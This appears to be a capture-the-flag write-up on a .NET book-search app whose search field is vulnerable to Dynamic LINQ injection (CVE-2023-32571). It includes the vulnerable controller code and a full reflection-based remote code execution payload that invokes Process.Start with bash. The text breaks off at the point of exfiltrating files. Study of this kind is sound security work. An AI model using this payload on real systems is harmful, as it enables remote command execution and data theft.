### Intruder

This challenege made use of a LINQ rce to exfiltrate data. A new thing i came across was the use of dnSpy/iLspy for reverse engineering compiled dlls

In the website there are 2 options- to view books or to add them. the adding function doesnt work but when we try to view and enter a " in the search box, an error appears
```Something wrong happened while searching!```. Hence time to look at src code

A Dynamic Link Library (DLL) is a type of executable file in Windows that contains reusable code, data, and resources that can be used by multiple programs at once. 
DLLs allow developers to create modular and efficient code, and share resources between different applications.

The source code had a number of dlls. Hence we had to go to the dockerfile.
In Dockerfile, the entry point is this bash command:
```
ENTRYPOINT ["dotnet", "CRUD.dll"]
```
[In Dockerfiles, an ENTRYPOINT instruction is used to set executables that will always run when the container is initiated.]

In this whenn we search for the code for book searching functionality, we’ll find it in class BookController method Index:
```
 public IActionResult Index(string searchString, int page = 1, int pageSize = 5)
    {
        try
        {
            IQueryable<Book> query = _books.AsQueryable();
            if (!string.IsNullOrEmpty(searchString))
            {
                query = query.Where("Title.Contains(\"" + searchString + "\")");
            }
            int totalItems = query.Count();
            int totalPages = (int)Math.Ceiling((double)totalItems / (double)pageSize);
            List<Book> books = query.Skip((page - 1) * pageSize).Take(pageSize).ToList();
            BookPaginationModel viewModel = new BookPaginationModel
            {
                Books = books,
                TotalPages = totalPages,
                CurrentPage = page
            };
            return View(viewModel);
        }
        catch (Exception)
        {
            base.TempData["Error"] = "Something wrong happened while searching!";
            return Redirect("/books");
        }
    }
```
It directly concatenates our searchString GET parameter’s value into query.Where:
The Where method belongs to LINQ (Language Integrated Query).

Language-Integrated Query (LINQ) is the name for a set of technologies based on the integration of query capabilities directly into the C# language. Traditionally, queries against data are expressed as simple strings without type checking at compile time or IntelliSense support. Furthermore, you have to learn a different query language for each type of data source: SQL databases, XML documents, various Web services, and so on. With LINQ, a query is a first-class language construct, just like classes, methods, and events. - https://learn.microsoft.com/en-us/dotnet/csharp/linq/

If we Google something like “LINQ vulnerability”, we can see a blog post mentioned that dynamic LINQ injection could result in RCE  The vulnerability is CVE ID “CVE-2023-32571”acc to which LINQ version 1.0.7.10 to 1.2.25 is vulnerable to that vulnerability. 
```"System.Linq.Dynamic.Core": "1.2.25"```
Hence we found the vuln

The paylaod given to bypass it is:
```
"".GetType().Assembly.DefinedTypes.Where(it.Name == "AppDomain").First().DeclaredMethods.Where(it.Name == "CreateInstanceAndUnwrap").First().Invoke("".GetType().Assembly.DefinedTypes.Where(it.Name == "AppDomain").First().DeclaredProperties.Where(it.name == "CurrentDomain").First().GetValue(null), "System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089; System.Diagnostics.Process".Split(";".ToCharArray())).GetType().Assembly.DefinedTypes.Where(it.Name == "Process").First().DeclaredMethods.Where(it.name == "Start").Take(3).Last().Invoke(null, "bash;-c <command-here>".Split(";".ToCharArray()))
```

Hence modifying to exfltrate our files:
first
